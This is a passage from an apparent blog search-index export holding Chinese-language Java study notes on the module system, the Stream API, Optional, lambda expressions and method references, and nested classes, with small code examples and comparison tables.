**命令行创建**\n- 新建一个项目主目录，如F:\\temp\\JavaModuleTest\n- 创建src目录(放java)，modules目录(放class)，lib目录(放jar)\n- 在src下面建立一个目录module.hello(**模块名字，可自由定**) \n- 在module.hello目录下，建立cn\\hello目录，再建立HelloWorld.java\n- 在module.hello目录下，建立一个module-info.java\n- 编译/运行/打包\n- 链接jlink，制作自定义运行时映像(custom runtime image)\n    -  舍弃无用庞大的JDK库 \n    -  适合在容器中快速部署运行\n\n### **Eclipse创建**\n- 新建一个Java Project项目主目录\n    - 可以在创建的时候，直接选择创建module-info.java\n    - 或者选中项目，右键configure选择Create module-info.java\n- 创建cn.hello.HelloWorld.java\n    - 可以选择在默认src目录下\n    - 可以新建一个source folder，取名module.hello，再创建包结构和类文件\n- 修改module-info.java\n- 编译/运行/打包\n\n### **注意事项**\n- Java Module和Maven Multi Module 不一样\n- 使用JDK 9+，不强制创建Java Module，即不创建module-info.java\n- Module的命名是由module-info.java来控制\n    - requires\n    - exports\n\n## **3.模块信息文件**\n### **module-info.java**\n- 模块安全控制的核心\n- 是模块和外界沟通的总负责\n- 名字和内容组成\n- 模块名字\n    - 模块名称必须唯一\n    - 可以不和包名相同\n    - 使用有代表性的词语\n    - 不需要包括版本号\n\n### **requires调用其他的模块**\n- java --list-modules查看系统提供的模块\n- java --describe-module看某一个模块\n- requires可以添加多个\n- 单纯requires，模块依赖不会传递\n- **requires N, 编译和运行都依赖于N**\n- **requires transitive N，编译和运行都传递依赖于N** \n- **requires static N，编译依赖于N，运行可选**\n- **requires transitive static N，编译传递依赖于N，运行可选**\n\n### **exports输出当前模块**\n- 只有输出，别人才能使用\n- exports可以指定某些包输出\n    - exports \\<package> \n- 限定输出到特定的模块使用\n    - exports \\<package> to \\<module1>, \\<module2>;\n\n### **opens将当前模块开放用于反射**\n- exports导出的包的public部分可以反射，其他权限修饰的内容和未导出的内容无法反射(setAccessible(true)也无效) \n- opens可以打开一些包，其他模块可以反射调用这些包及内容\n- open module 打开整个模块\n- 打开一个包\n    - opens \\<package>\n- 仅对某些模块打开一个包\n    - opens \\<package> to \\<module1>, \\<module2>;\n\n## **4.服务**\n- Java 模块系统引入的新功能，实现解耦\n- **模块对外只暴露接口，隐藏实现类**\n- provides提供接口，with实现类(不导出) \n- uses消费接口\n- ServiceLoader加载接口的实现类\n```java\nmodule module.first {\n    exprots first.p1;\n    provides first.p1.Shoe with first.p2.DoubleStar;\n}\n\nmodule module.second {\n    requires module.first;\n    uses first.p1.Shoe;\n}\n\nServiceLoader<Shoe> objs = ServerLoader.load(Shoe.class);\nfor(Shoe obj : objs) {\n    obj.walk();\n}\n```\n\n- ServiceLoader通过load加载接口的实现类(with语句提供) \n- 每次load，(默认情况下)都会产生新的各自独享的实例，没有唯一的服务实例\n- 可以调用reload进行刷新\n\n- Java 模块系统提供两种方法创建服务实例\n    - 服务实现类有public的无参构造函数\n    - 使用单独的静态提供者方法\n        - 一个名为provider的public static 无参数方法\n        - 返回服务接口或子类\n```java\nprovides first.p1.Shoe with first.p1.ShoeFactory;\n\npublic class ShoeFactory {\n    public static Shoe provider() {\n        Shoe result = new Shoe();\n        return result;\n    }\n}\n```\n\n## **5.Java模块化应用**\n- Java 模块化系统(Java 9+)\n    - 从根源上对JDK进行模块化，降低最终程序运行时负载\n    - 在jar层上增加一个module机制\n    - 引入exports/requires/opens明确模块边界和依赖关系，程序更隐私安全\n    - 引入服务provides/uses使得程序更解耦\n    - jlink制作运行时映像，使运维更高效\n\n- 向Java 模块化系统迁移的制约因素\n    - Java模块化系统尚未成熟，存在较多变化\n        - 只有11是LTS，9/10/12/13均是STS\n    - Java 9+ JDK版权收费，很多程序员和厂商还是使用Java 8\n    - 已有的庞大的第三方库，基本不是基于模块开发的，完全融入或使用模块重新开发有困难\n    - 构建工具和开发工具IDE尚未大力支持\n\n- 已有的模块系统OSGi\n    - OSGi, Open Service Gateway Initiative, https://www.osgi.org/\n    - 在OSGi容器里面运行bundle，通过类加载器来控制类的可见性\n- Java模块化 vs OSGi\n    - Java 更偏源头控制，从JDK开始分模块开发和部署\n    - OSGi更偏动态性控制，对bundle进行全生命周期控制\n    - Java模块化更年轻，尚未成熟，OSGi已经发展多年，更完整\n    - 两者互相借鉴和互操作\n    - https://www.infoq.com/articles/java9-osgi-future-modularity/","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java Stream流","url":"/reimu-lighthouse/20210922/java-stream/","content":"## **1.流的概述**\na sequence of elements from source that supports aggregate operations\n- sequence of elements: 一个流对外提供一个接口，可以访问到一串特定的数据。**流不存储元素**，但是可以根据需要进行计算转化\n- source：数据来源，如数据结构，数组，文件等\n- aggregate operation：聚合操作，流支持像SQL操作或者其他函数式语言的操作，如filter/map/reduce/find/match/sorted等\n- pipelining: 很多流操作也是返回一个流\n- Internal Iteration: 流操作进行迭代，用户感知不到循环遍历\n\n### **Stream语法**\n- 类似SQL语句，遵循“做什么而非怎么做”原则\n\n### **流的工作流程**\n- 流的创建\n- 流的转换，将流转换为其他流的中间操作，可包括多个步骤(惰性操作) \n- 流的计算结果。这个操作会强制执行之前的惰性操作。这个步骤以后，流就再也不用了\n\n## **2.流的创建**\n- Collection接口的stream方法\n    ```java\n    Stream<String> a1 = new ArrayList<String>().stream();\n    Stream<String> a2 = new HashSet<String>().stream();\n    ```\n    - 还有其他的子类，如LinkedList, LinkedSet, TreeSet, Vector等 \n- Arrays.stream可以将数组转为Stream\n    ```java\n    Stream<String> b1 = Arrays.stream(\"a,b,c,d,e\".split(\",\"), 3, 5);\n    ```\n- 利用Stream类进行转化\n    - of 方法，直接将数组转化\n    ```java\n    Stream<Integer> c1 = Stream.of(new Integer[5]);\n    Stream<String> c2 = Stream.of(\"a,b,c\".split(\",\"));\n    Stream<String> c3 = Stream.of(\"a\", \"b\", \"c\");\n    ```\n    - empty方法，产生一个空流\n    ```java\n    Stream<String> d1 = Stream.empty();\n    ```\n- 利用Stream类进行转化\n    - generate 方法，接收一个Lambda表达式\n    ```java\n    Stream<String> e1 = Stream.generate(()->\"hello\");\n    Stream<Double> e2 = Stream.generate(Math::random);\n    ```\n    - iterate方法，接收一个种子，和一个Lambda表达式\n    ```java\n    Stream<BigInteger> e3 = Stream.iterate(BigInteger.ZERO, n -> n.add(BigInteger.ONE));\n    ```\n- 其他类/方法产生Stream流 \n    - Files.lines方法\n    ```java\n    Stream<String> contents = Files.lines(Paths.get(\"C:/abc.txt\")); \n    ```\n    - Pattern的splitAsStream方法\n    ```java\n    Stream<String> words = Pattern.compile(\",\").splitAsStream(\"a,b,c\");\n    ```\n\n### **基本类型流**\n- IntStream，LongStream，DoubleStream\n```java\nIntStream s1 = IntStream.of(1,2,3,4,5);\n\ns1 = Arrays.stream(new int[] {1,2,3});        \ns1 = IntStream.generate(()->(int)(Math.random() * 100));        \ns1 = IntStream.range(1,5); //1,2,3,4  step 1        \ns1 = IntStream.rangeClosed(1,5); //1,2,3,4,5\n\nIntStream s2 = IntStream.of(1,2,3,4,5);\nStream<Integer> s3 = s2.boxed();\nIntStream s5 = s3.mapToInt(Integer::intValue);\n```\n\n### **并行流**\n- 使得所有的中间转换操作都将被并行化\n- Collections.parallelStream()将任何集合转为并行流\n- Stream.parallel()方法，产生一个并行流\n```java\nIntStream s1 = IntStream.range(1,10000000);\nlong evenNum = s1.parallel().filter(n->n%2==0).count();\nSystem.out.println(evenNum);\n```\n- **注意：需要保证传给并行流的操作不存在竞争**\n\n## **3.Stream的转换**\n### **过滤filter**\n- filter(Predicate\\<? super T> predicate)\n- 接收一个Lambda表达式，对每个元素进行判定，符合条件留下\n```java\nStream<Integer> s1 = Stream.of(1, 2, 3, 4, 5);\nStream<Integer> s2 = s1.filter(n -> n>2);\ns2.forEach(System.out::println);\n//3, 4, 5\n```\n\n### **去重distinct**\n- distinct()\n- 对流的元素进行过滤，去除重复，只留下不重复的元素\n```java\n//基本类型包装类对象去重\nStream<Integer> s1 = Stream.of(1, 1, 2, 2, 3, 3);\nStream<Integer> s2 = s1.distinct();\ns2.forEach(System.out::println);\n// 1, 2, 3\n\n//自定义对象的去重\nArrayList<Student> students = new ArrayList<Student>();\nstudents.add(new Student(\"Tom\", 20));\nstudents.add(new Student(\"Tom\", 20));\nstudents.add(new Student(\"Jerry\", 20));\nstudents.add(new Student(\"Jerry\", 18));\n\n// 先对象的hashCode再调用equals方法进行判重\nStream<Student> s3 = students.stream().distinct();\ns3.forEach(System.out::println);\n```\n\n### **排序sorted**\n- sorted()\n- 对流的基本类型包装类元素进行排序\n```java\nStream<Integer> s1 = Stream.of(3,2,4,1,5);\nStream<Integer> s2 = s1.sorted();\ns2.forEach(System.out::println);\n//1, 2, 3, 4, 5\n```\n- 提供Comparator，对流的元素进行排序\n```java\nString[] planets = new String[] { \n        \"Mercury\", \"Venus\", \"Earth\", \n        \"Mars\", \"Jupiter\", \"Saturn\", \n        \"Uranus\", \"Neptune\" };\n\nStream<String> s3 = Stream.of(planets).sorted(\n        Comparator.comparing(String::length));\ns3.forEach(System.out::println);\n```\n- 对流的自定义对象元素进行排序，调用对象的compareTo方法\n```java\nArrayList<Cat> cats = new ArrayList<>();\ncats.add(new Cat(3));\ncats.add(new Cat(2));\ncats.add(new Cat(5));\ncats.add(new Cat(1));\ncats.add(new Cat(4));\nStream<Cat> s4 = cats.stream().sorted();\ns4.forEach(System.out::println);\n```\n\n### **转化map**\n- 利用方法引用对流每个元素进行函数计算\n```java\nStream<Double> s1 = Stream.of(-1.5, 2.5, -3.5);\nStream<Double> s2 = s1.map(Math::abs);\ns2.forEach(System.out::println);\n```\n- 利用Lambda表达式对流每个元素进行函数计算\n```java\nStream<Integer> s3 = Stream.of(1,2,3,4,5);\nStream<Integer> s4 = s3.map(n->n*n);\ns4.forEach(System.out::println);\n```\n- 利用方法引用，对流每个元素进行函数计算返回Stream\n```java\nString[] planets = new String[] { \n        \"Mercury\", \"Venus\", \"Earth\"};\n\nStream<String> allLetters2 = \n        Stream.of(planets).flatMap(word -> letters(word));\nallLetters2.forEach(System.out::print);\n//flatMap 执行一对多的转换，然后将所有的Map都展开\n//['M','e','r','c','u','r','y',\n// 'V','e','n','u','s',\n// 'E','a','r','t','h']\n\npublic static Stream<String> letters(String word)\n{\n    List<String> result = new ArrayList<>();\n    for(int i=0;i<word.length();i++)\n    {\n        result.add(word.substring(i, i+1));\n    }\n    return result.stream();\n}\n```\n- 利用方法引用，对流每个元素进行函数计算返回Stream，并合并\n```java\nStream<Stream<String>> allLetters = \n        Stream.of(planets).map(word -> letters(word));\nallLetters.forEach(System.out::print);\n//[['M','e','r','c','u','r','y'],\n// ['V','e','n','u','s'],\n// ['E','a','r','t','h']]\n```\n\n### **抽取limit**\n```java\n//获取前n个元素\nStream<Integer> s1 = Stream.of(1,2,3,4,5,6,7,8,9,10);\nStream<Integer> s2 = s1.limit(3);\ns2.forEach(System.out::println);\n```\n\n### **跳过skip**\n```java\n//跳过前n个元素\nStream<Integer> s3 = Stream.of(1,2,3,4,5,6,7,8,9,10);\nStream<Integer> s4 = s3.skip(8);\ns4.forEach(System.out::println);\n```\n\n### **连接concat**\n```JAVA\n//连接两个流\nStream<String> s5 = Stream.concat(letters(\"hello\"), letters(\"world\"));\ns5.forEach(System.out::println);\n```\n\n### **额外调试peek**\n```java\nStream<Double> s1 = Stream.iterate(1.0, n -> n*2)\n        .peek(n -> System.out.println(\"number:\" + n)).limit(5);\ns1.forEach(System.out::println);\n```\n\n## **4.Optional类型**\n- 一个包装器对象\n- 要么包装了类型T的对象，要么没有包装任何对象(**还是null**)\n- **如果T有值，那么直接返回T的对象**\n- **如果T是null，那么可以返回一个替代物**\n```java\nOptional<String> s1 = Optional.of(new String(\"abc\"));\nString s2 = s1.get();\nSystem.out.println(\"s2: \" + s2); //abc\n\nOptional<String> s3 = Optional.empty();\nString s4 = s3.orElse(\"def\"); \nSystem.out.println(\"s4: \" + s4); //def\n```\n\n### **Optional\\<T>创建**\n- of方法\n- empty方法\n- **ofNullable方法，对于对象有可能为null情况下，安全创建**\n```java\nOptional<String> s5 = Optional.of(new String(\"abc\"));\nOptional<String> s6 = Optional.empty();\nString s7 = null;\nOptional<String> s8 = Optional.ofNullable(s7); \n//s7不为Null，s8就是s7, 否则s8就为Optional.empty()\n```\n\n### **Optional\\<T>使用**\n- get方法，获取值，不安全的用法\n-orElse方法，获取值，如果为null，采用替代物的值\n- orElseGet方法，获取值，如果为null，采用Lambda表达式值返回\n- orElseThrow方法，获取值，如果为null，抛出异常\n- ifPresent方法，判断是否为空，不为空返回true\n- isPresent(Consumer), 判断是否为空，如果不为空，则进行后续Consumer操作,如果为空，则不做任何事情\n- map(Function), 将值传递给Function函数进行计算。如果为空，则不计算\n\n### **Optional\\<T>注意事项**\n- 直接使用get，很容易引发NoSuchElementException异常\n- 使用isPresent判断值是否存在，这和判断null是一样的低效\n\n## **5.流的计算结果**\n### **简单约简(聚合函数)**\n- count(), 计数\n```java\nStream<Integer> s1 = Stream.of(a);\nlong countResult = s1.filter(n-> n>0).count();\n```\n- max(Comparator)，最大值，需要比较器\n```java\nStream<Integer> s2 = Stream.of(a);\nOptional<Integer> maxResult = s2.max((n1,n2)->n1-n2);\n```\n- min(Comparator)，最小值，需要比较器\n```java\nStream<Integer> s3 = Stream.of(a);\nOptional<Integer> minResult = s3.min((n1,n2)->n1-n2);\n```\n- findFirst(), 找到第一个元素\n```java\nStream<Integer> s4 = Stream.of(a);\nOptional<Integer> first = s4.findFirst();\n```\n- findAny(), 找到任意一个元素\n```java\nStream<Integer> s5 = Stream.of(a);\nOptional<Integer> random = s5.findAny();\n```\n- anyMatch(Predicate)，如有任意一个元素满足Predicate，返回true\n```java\nStream<Integer> s6 = Stream.of(a);\nSystem.out.println(s6.anyMatch(n -> n>6));\n```\n- allMatch(Predicate)，如所有元素满足Predicate，返回true\n```java\nStream<Integer> s7 = Stream.of(a);\nSystem.out.println(s7.allMatch(n -> n>6));\n```\n- noneMatch(Predicate)，如没有任何元素满足Predicate，返回true\n```java\nStream<Integer> s8 = Stream.of(a);\nSystem.out.println(s8.noneMatch(n->n>100));\n```\n\n### **自定义约简**\n- reduce，传递一个二元函数BinaryOperator，对流元素进行计算\n- 如求和、求积、字符串连接等\n```java\nInteger[] a = new Integer[] {2,4,6,8};\n        \nStream<Integer> s1 = Stream.of(a);\nOptional<Integer> sum = s1.reduce(Integer::sum);\nSystem.out.println(sum.get());\n\nStream<Integer> s2 = Stream.of(a);\nOptional<Integer> product = s2.reduce((x,y)->x*y);\nSystem.out.println(product.get());\n\nStream<Integer> s3 = Stream.of(a);\nInteger product3 = s3.reduce(1,(x,y)->x*y);\nSystem.out.println(product3);\n\nString[] b = new String[] {\"abc\",\"def\",\"ghi\"};\nStream<String> s4 = Stream.of(b);\nString bigStr = s4.reduce(\"\",(x,y)->x+y);\nSystem.out.println(bigStr);\n```\n\n### **查看/遍历元素**\n- iterator()，遍历元素\n- forEach(Consumer)，应用一个函数到每个元素上\n```java\nInteger[] a = new Integer[] {2,4,6,8};\n        \nStream<Integer> s1 = Stream.of(a);\nIterator<Integer> it1 = s1.filter(n->n>2).iterator();\nwhile(it1.hasNext()) {\n    System.out.println(it1.next());\n}\n\nStream<Integer> s2 = Stream.of(a);\ns2.filter(n->n>2).forEach(System.out::println);\n```\n\n### **存放到数据结构中**\n- toArray()，将结果转为数组\n- collect(Collectors.toList()),将结果转为List\n```java\n//List\nStream<Integer> s1 = Stream.of(a);\nList<Integer> list1 = s1.collect(Collectors.toList());\n\n//Linkedlist\nStream<Integer> s2 = Stream.of(a);\nList<Integer> list2 = s2.collect(Collectors.toCollection(LinkedList::new));\n```\n- collect(Collectors.toSet()),将结果转为Set\n```java\nStream<Integer> s3 = Stream.of(a);\nSet<Integer> set1 = s3.collect(Collectors.toSet());\n```\n- collect(Collectors.toMap()), 将结果转为Map\n```java\nList<Person> persons = new ArrayList<Person>();\npersons.add(new Person(1, \"Jerry\"));\npersons.add(new Person(2, \"Tom\"));\n\n//将流存储为Map\nStream<Person> s6 = persons.stream();\nMap<Integer, String> map1 = s6.collect(Collectors.toMap(Person::getId, Person::getName));\n```\n- collect(Collectors.joining()), 将结果连接起来\n```java\n//将流变换为字符流，并连接起来\nStream<Integer> s4 = Stream.of(a);\nString result = s4.map(String::valueOf).collect(Collectors.joining());\nSystem.out.println(result); //2468\n\n//将流变换为字符流，并连接起来\nStream<Integer> s5 = Stream.of(a);\nString result2 = s5.map(String::valueOf).collect(Collectors.joining(\",\"));\nSystem.out.println(result2); //2,4,6,8\n```\n\n### **流的高阶计算**\n- 分组groupingBy和分区partitionBy\n- 分组后的约简\n    - counting\n    - summing\n    - maxBy\n    - minBy\n- 以上方法均在java.util.stream.Collectors中\n\n## **6.流的应用**\n### **Java Stream的优点**\n- 统一转换元素\n- 过滤元素\n- 利用单个操作合并元素\n- 将元素序列存放到某一个集合中\n- 搜索满足某些条件的元素的序列\n- **类似SQL操作，遵循“做什么而非怎么做”原则**\n- **简化了串行/并行的大批量操作**\n\n### **Java Stream vs 循环迭代代码**\n- Stream广泛使用Lambda表达式，只能读取外围的final或者effectively final变量，循环迭代代码可以读取/修改任意的局部变量。\n- 在循环迭代代码块中，可以随意break/continue/return，或者抛出异常，而Lambda表达式无法完成这些事情。\n- **Stream流不是淘汰循环迭代代码，应该是两者相互搭配使用**\n\n### **Stream应用注意事项**\n- 一个流，一次只能一个用途，不能多个用途，用了不能再用\n- 避免创建无限流\n- 注意操作顺序\n- 谨慎使用并行流\n    - 底层使用Fork-Join Pool，处理计算密集型任务\n    - 数据量过小不用\n    - 数据结构不容易分解的时候不用，如LinkedList等 –数据频繁拆箱装箱不用\n    - 涉及findFirst或者limit的时候不用\n\n### **Stream vs Collection**\n- Stream和Collection两者可以互相转化\n- 如果数据可能无限，用Stream\n- 如果数据很大很大，用Stream\n- 如果调用者将使用查找/过滤/聚合等操作，用Stream\n- 当调用者使用过程中，发生数据改变，而调用者需要对数据一致性有较高要求，用Collection","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java Lambda表达式","url":"/reimu-lighthouse/20210922/java-lambda/","content":"## **1.Lambda表达式基础**\n- 类似于匿名方法，一个没有名字的方法\n- 参数，箭头，表达式语句\n- 可以忽略写参数类型\n- **坚决不声明返回值类型**\n- 没有public/protected/private/static/final等修饰符\n- 单句表达式，将直接返回值，不用大括号\n- 带return语句， 算多句，必须用大括号\n\n- 无参数，**仅保留括号**，箭头，表达式\n```java\nnew Thread(\n            ()->\n                {\n                    int sum=0;\n                    for(int i=1;i<=100;i++)\n                    {\n                        sum = sum + i;\n                    }\n                    System.out.println(\"总和:\" + sum);\n                }\n            ).start();\n```\n- 一个参数，**可省略括号**，箭头，表达式\n```java\nAdder  c1 = \n                x -> \n                {\n                    x++;\n                };\n```\n- **如果有返回值，返回值类型会在上下文推断出来的，无需声明**\n- 只在某几个分支有返回值，这样是不合法的\n```java\nAdder  c2 =\n                x ->\n                {\n                    if(x>0)\n                        return x+1;//wrong\n                };\n```\n## **2.函数式接口**\n- **是一个接口，符合Java接口的定义**\n- **只包含一个抽象方法的接口**\n- 可以包括其他的default方法、static方法、private方法\n- 由于只有一个未实现的方法，所以Lambda表达式可以自动填上这个尚未实现的方法\n- 采用Lambda表达式，可以自动创建出一个(**伪**)嵌套类的对象(**没有实际的嵌套类class文件产生**)，然后使用，比真正嵌套类**更加轻量**，更加简洁高效\n\n### **系统自带的函数式接口**\n- 涵盖大部分常用的功能，可以重复使用\n- 位于java.util.function包中\n#### **Predicate\\<T>: 接收一个参数，返回一个布尔值**\n```java\nPredicate<String> oddLength = s -> \n    s.length()%2 == 0 ? false:true;\n\nfor(String p : planets)    {\n    if(oddLength.test(p)) {\n        System.out.println(p);\n    }\n}\n```\n#### **Consumer\\<T>：接收一个参数，做操作，无返回**\n```java\nConsumer<String> printer = s -> \n    System.out.println(\"Planet :\" + s);\n\nfor(String p : planets)    {\n    printer.accept(p);\n}            \n```\n#### **Supplier\\<T>：无输入参数，返回一个数据**\n```java\nSupplier<String> planetFactory = () -> \n    planets[(int) floor(random() * 8)];\n\nfor (int i = 0; i < 5; i++) {\n    System.out.println(planetFactory.get());\n}\n```\n#### **Function\\<T>：接收一个参数，返回一个参数**\n```java\nFunction<String, String> upper = s -> \n    {\n        //可以做更复杂的操作\n        return s.toUpperCase();\n    };\n\nfor(String p : planets)    {\n    System.out.println(upper.apply(p));\n}\n```\n\n## **3.方法引用**\n- Lambda表达式支持传递现有的类库函数\n\n- Class::staticMethod，如 Math::abs方法\n- Class::instanceMethod，如String::compareToIgnoreCase方法\n- object::instanceMethod，如System.out::println方法\n    - 支持this::instanceMethod 调用\n    - 支持super::instanceMethod调用\n- Class::new，调用某类构造函数，支持单个对象构建\n- Class[]::new，调用某类构造函数，支持数组对象构建\n\n### **Class::staticMethod**\n- 等价于提供方法参数的Lambda表达式\n- Math::abs 等价于 x -> Math.abs(x)\\\n```java\npublic class ClassStaticMethodTest {\n    public static double worker(NumFunction nf, double num)\n    {\n        return nf.calculate(num);\n    }\n    public static void main(String[] args) {\n        double a = -5.3;\n        double b = worker(Math::abs, a);\n        System.out.println(b);\n        \n        double c = worker(Math::floor, a);\n        System.out.println(c);\n    }    \n}\n\ninterface NumFunction {\n    double calculate(double num);\n}\n```\n\n### **Class::instanceMethod**\n- 第一个参数将变成方法的执行体\n- String::compareToIgnoreCase等价于(x,y)->x.compareToIgnoreCase(y)\n```java\nString[] planets = new String[] { \n        \"Mercury\", \"Venus\", \"Earth\", \"Mars\", \n        \"Jupiter\", \"Saturn\", \"Uranus\",\n        \"Neptune\" };    \n\nArrays.sort(planets, String::compareToIgnoreCase);\nSystem.out.println(Arrays.toString(planets));        \n```\n\n### **object::instanceMethod**\n- 等价于提供方法参数的Lambda表达式\n- System.out::println等价于x->System.out.println(x)\n```java\npublic class ObjectInstanceMethodTest {\n\n    public static void worker(PrintFunction pf, String s) {\n        pf.exec(s);\n    }\n    \n    public static void main(String[] args) {\n        String a = \"abc\";\n        worker(System.out::println, a);\n    }\n}\n\ninterface PrintFunction {\n    public void exec(String s);\n}\n```\n- 支持this::instanceMethod\n```java\npublic class ThisInstanceMethodTest {\n    public static void main(String[] args) {\n        ThisInstanceMethodTest obj = new ThisInstanceMethodTest();\n        obj.test();\n    }    \n    \n    public void test()    {\n        String[] planets = new String[] { \n                \"Mercury\", \"Venus\", \"Earth\", \"Mars\", \n                \"Jupiter\", \"Saturn\", \"Uranus\", \"Neptune\" };    \n                \n        Arrays.sort(planets, this::lengthCompare);\n        System.out.println(Arrays.toString(planets));    \n    }\n    \n    public int lengthCompare(String first, String second){\n        return first.length() - second.length();\n    }\n}\n```\n- 支持super::instanceMethod\n```java\npublic class SuperInstanceMethodTest extends Father{\n    public static void main(String[] args) {\n        SuperInstanceMethodTest obj = new SuperInstanceMethodTest();\n        obj.test();\n    }    \n    \n    public void test()    {\n        String[] planets = new String[] { \n                \"Mercury\", \"Venus\", \"Earth\", \"Mars\", \n                \"Jupiter\", \"Saturn\", \"Uranus\", \"Neptune\" };    \n                \n        Arrays.sort(planets, super::lengthCompare);\n        System.out.println(Arrays.toString(planets));    \n    }\n}\n\nclass Father {\n    public int lengthCompare(String first, String second){\n        return first.length() - second.length();\n    }\n}\n```\n\n### **Class::new**\n```java\nSupplier<Person> s = Person::new;\nPerson p = s.get();\n```\n\n### **Class[]::new**\n```java\nIntFunction<int[]> intArray = int[]::new;        \nint[] nums = intArray.apply(10); \n\nFunction<Integer, Person[]> personArray = Person[]::new;\nPerson[] persons = personArray.apply(5);\n```\n\n## **4.Lambda表达式应用**\n- Lambda表达式**没有存储目标类型(target type)的信息**\n- 重载调用，依据重载的规则和类型参数推理\n\n### **变量遮蔽**\n- **Lambda表达式和匿名内部类/局部内部类一样，可以捕获变量(capture variables)，即访问外部嵌套块的变量**\n    - 但是变量要求是final或者是effectively final的 \n- **Lambda表达式没有变量遮蔽问题，因为它的内容和嵌套块有着相同的作用域**\n    - 在Lambda表达式中，不可以声明与(外部嵌套块)局部变量同名的参数或者局部变量\n- 表达式中的this，就是创建这个表达式的方法的this参数\n\n### **优先级**\n- Lambda表达式优先级比嵌套类要高\n    - 短小精干，本身可以自描述的\n    - 无法创建命名实例，无法获取自身的引用(this)\n- 方法引用比自定义Lambda表达式的优先级高\n    - 系统自带的方法引用更简洁高效\n    - 对于复杂的Lambda表达式，采用方法引用比内嵌Lambda表达式更清晰，更容易维护\n- 坚持使用标准的函数式接口\n    - 更容易学习，提高互操作性","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 嵌套类","url":"/reimu-lighthouse/20210922/java-nested-class/","content":"## **1.嵌套类基础**\n- 一个类定义在别的类的内部\n\n### **嵌套类**\n- 静态嵌套类：Static nested classes,即类前面有static修饰符\n```java\npublic class Outer {\n    String name;\n    \n    static class Inner {\n        String name;\n    }\n}\n```\n- 非静态嵌套类：Non-static nested classes, 又名**内部类，Inner classes**\n    - 普通内部类(亦翻译为:成员内部类) \n    ```java\n    public class Outer {\n        String name;\n\n        public class Inner {\n            Stirng name;\n        }\n    }\n    ```\n    - 局部内部类(Local classes)\n    ```java\n    public class Outer {\n        String name;\n        \n        public void f1() {\n            class Inner {\n                String name;\n            }\n        }\n    }\n    ```\n    - 匿名内部类(Anonymous classes)\n    ```java\n    public class Outer {\n        String name;\n\n        public void f1() {\n            new Thread(new Runnable(){\n                public void run() {\n                    System.out.println(\"hello\");\n                }\n            }).start;\n        }\n    }\n    ```\n\n## **2.匿名内部类和局部内部类**\n### **匿名内部类**\n- **没有类名**的内部类，必须继承**一个**父类/实现**一个**父接口\n- 在实例化以后，迅速转型为**父类/父接口**\n- 这种类型的对象，只能new一个对象，之后以对象名字操作\n- 可在普通语句和成员变量赋值时使用内部类\n- 没有**正式类名**的内部类\n    - 编译器产生内部名字：类名+$+数字编号\n- 没有类名，**没有构造函数**，能用父类/父接口的构造函数(可带参数) \n- 可以**继承、改写、补充**父类/父接口的方法\n- 内部不可以**新定义**静态成员(变量+方法)，常量除外\n- 可以访问外部包围类的成员变量和方法(包括private)\n- **如果定义在静态方法中，也只能访问外部包围类的静态成员**\n- 没有类名，**外部包围类和其他类也无法访问到匿名内部类**\n\n### **局部内部类**\n- 定义在代码块中的非静态的类，如方法，for循环，if语句等\n- 定义后，即可创建对象使用\n- 只能活在这个代码块中，代码块结束后，**外界无法使用该类**\n- 编译后名称：外部类名+$+序号+内部类名\n- 可以继承其他类，或者实现其他接口\n- 非静态的类，不能包含静态成员(变量和方法)，除了常量\n- 可以访问外部包围类的成员\n- 如果定义在静态方法中，只能访问包围类的静态成员\n- 局部内部类不能是一个接口，即接口不能定义在代码块中\n\n## **3.普通内部类和静态嵌套类**\n### **普通内部类**\n- 非static的类，定义在某个类的成员变量位置\n- 定义后，在类里面均可以使用\n- 编译后名称：外部类名+$+内部类名\n- 可以继承其他类，或者实现其他接口\n- 可以用private/package private(不写)/protected/public控制外界访问\n- 非静态的类，不能包含静态变量/方法，除了常量\n- 和外部包围类的实例相关，**一个普通内部类实例**肯定是在**一个外部包围类的实例中**，且可以访问外部包围类的所有成员\n- **在第三方类中，需要先创建外部包围类实例，才能创建普通内部类的实例，不允许单独的普通内部类对象存在！！！**\n\n### **静态嵌套类**\n- 层级和包围类(enclosing class)的成员变量/方法一样\n- 第三方需要通过外部包围类才可以访问到静态嵌套类\n    - Outer1.Inner1 obj = new Outer1.Inner1();\n- **需要加修饰符static**\n- **可以定义静态成员和非静态成员**\n- **不能直接访问包围类的非静态成员，可直接访问包围类的静态成员**\n    - **可通过包围类的对象进行访问非静态成员**\n- 外界可以通过静态嵌套类名访问其静态成员，通过对象访问其非静态成员\n- **外界需要通过包围类才可以访问到静态嵌套类，并创建其对象，不需要外部包围类的实例**\n\n## **4.嵌套类对比**\n||位置|名字|作用范围|基本信息|\n|-|-|-|-|-|\n|匿名内部类|成员变量或者成员方法内|外部类名+$+数字编号|跟随被赋值变量的作用范围，外界无法访问|没有类名，没有构造函数，没有static没有private/ default/ protected/ public 修饰|\n|局部内部类|成员方法内|外部类名+$+序号+内部类名|所在的方法内，外界无法访问|有类名，有构造函数，没有static，没有private/ default/ protected/ public 修饰|\n|普通内部类|成员变量|外部类名+$+内部类名|包围类内可以访问，外界可以访问|有类名，有构造函数，没有static有private/ default/ protected/ public 修饰|\n|静态嵌套类|成员变量|外部类名+$+内部类名|包围类内可以访问，外界可以访问|有类名，有构造函数，有static有private/ default/ protected/ public 修饰|\n\n\n||嵌套类内部的内容|可访问的外部包围类内容|和外部类关系|\n|-|-|-|-|\n|匿名内部类|不能带静态成员，除了常量|访问外部的所有成员|在外部类对象内部|\n|局部内部类|不能带静态成员，除了常量|访问外部的所有成员|在外部类对象内部|\n|普通内部类|不能带静态成员，除了常量|访问外部的所有成员|外界可以new，但是对象必须依附于一个外部包围类对象|\n|静态嵌套类|可以定义静态成员变量和方法|访问外部的所有静态成员|外界可以new，可独立进行工作|\n\n\n### **外部访问规则**\n- 普通内部类和静态嵌套类可以被外部访问\n- 外部访问普通内部类和静态嵌套类，和普通类之间访问规则**一样**\n\n||同一个类|同一个包|不同包的子类|不同包的非子类|\n|-|-|-|-|-|\n|private|√\n|default|√|√\n|protected|√|√|√\n|public|√|√|√|√\n\n\n### **变量遮蔽：Shadowing**\n- 嵌套类变量和外部包围类的变量重名\n    - 以离得近作为优先原则\n    - 优先级高的变量会遮蔽优先级低的变量\n    - **外部包围类.this.变量名**，可以访问到外部包围类的成员变量\n    - 静态嵌套类不能访问非静态变量\n    - Java 7及以前，匿名内部类和局部内部类只能访问外部包围类的final成员变量\n    - Java 